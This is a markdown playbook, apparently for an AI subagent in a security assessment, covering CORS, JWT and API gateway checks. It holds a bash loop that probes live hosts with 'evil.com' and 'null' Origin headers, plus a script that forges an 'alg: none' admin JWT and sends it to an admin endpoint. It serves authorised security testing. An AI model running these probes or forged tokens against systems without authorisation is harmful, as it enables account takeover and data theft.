# Subagent 04: Defensive API Gateways, Token Policies & CORS Security

## Role & Mission
Responsible for evaluating perimeter API gateway policies, JWT token handling, rate-limiting headers, and Cross-Origin Resource Sharing (CORS) misconfigurations.

## Assigned Checklist Tasks (8 Checks)
- **Check 18:** API Key validation and scope enforcement
- **Check 19:** JWT signature verification defenses (`alg: none`, weak HMAC secrets)
- **Check 20:** Cross-Origin Resource Sharing (CORS) arbitrary origin reflection
- **Check 21:** CORS `null` origin reflection and credential exposure
- **Check 22:** Gateway request schema validation and unexpected parameter stripping
- **Check 23:** Reverse proxy header tampering (`X-Forwarded-For`, `X-Original-URL`)
- **Check 24:** Gateway rate limiting headers (`X-RateLimit-*`)
- **Check 25:** Centralized API security logging and anomaly detection

---

## Standardized Execution Playbook

### Step 1: CORS Misconfiguration Probing (Checks 20, 21)
Test live API hosts for arbitrary origin reflection and credential inclusion:

```bash
mkdir -p artifacts/cors/

cat artifacts/live_subdomains.txt 2>/dev/null | head -n 40 | while read -r host; do
  # 1. Test arbitrary external origin reflection
  resp=$(curl -sk -H "Origin: https://evil.com" -I "${host}/api/" --max-time 4 2>/dev/null)
  
  if echo "$resp" | grep -qi "access-control-allow-origin: https://evil.com"; then
    creds=$(echo "$resp" | grep -i "access-control-allow-credentials: true")
    if [ -n "$creds" ]; then
      echo "[CORS-CRITICAL] $host reflects arbitrary origin WITH credentials!" | tee -a artifacts/cors/vulnerable.txt
    else
      echo "[CORS-LOW] $host reflects origin without credentials (low impact)" | tee -a artifacts/cors/untrusted_origin.txt
    fi
  fi
  
  # 2. Test 'null' origin reflection (sandboxed iframes / local file context)
  resp_null=$(curl -sk -H "Origin: null" -I "${host}/api/" --max-time 4 2>/dev/null)
  if echo "$resp_null" | grep -qi "access-control-allow-origin: null"; then
    echo "[CORS-NULL] $host accepts null origin" | tee -a artifacts/cors/null_origin.txt
  fi
done
```

### Step 2: Severity Kill Rules for CORS Findings
- **KILL** — CORS misconfiguration where `Access-Control-Allow-Origin: *` or `https://evil.com` is present, but `Access-Control-Allow-Credentials: true` is **absent** and the endpoint does not return confidential authenticated PII/session data.
- **KILL** — Origin reflection on purely static public assets (images, CSS, public JS bundles).
- **KEEP (HIGH/CRITICAL)** — Arbitrary origin reflection paired with `Access-Control-Allow-Credentials: true` on endpoints returning user profiles, orders, keys, or transactional data.

### Step 3: JWT Security & Gateway Defenses (Checks 18, 19)
```bash
# Test 'alg: none' tampering against gateway
HEADER_B64=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr -d '=' | tr '/+' '_-')
PAYLOAD_B64=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w 0 | tr -d '=' | tr '/+' '_-')
TAMPERED_JWT="${HEADER_B64}.${PAYLOAD_B64}."

curl -sk -X GET "https://<target>/api/v1/admin/dashboard" \
  -H "Authorization: Bearer ${TAMPERED_JWT}"
```

---

## Output Artifacts
- `artifacts/cors/vulnerable.txt` — Confirmed high-severity CORS misconfigurations.
- `artifacts/gateway_policy_remediations.md` — Hardening recommendations for API gateways.
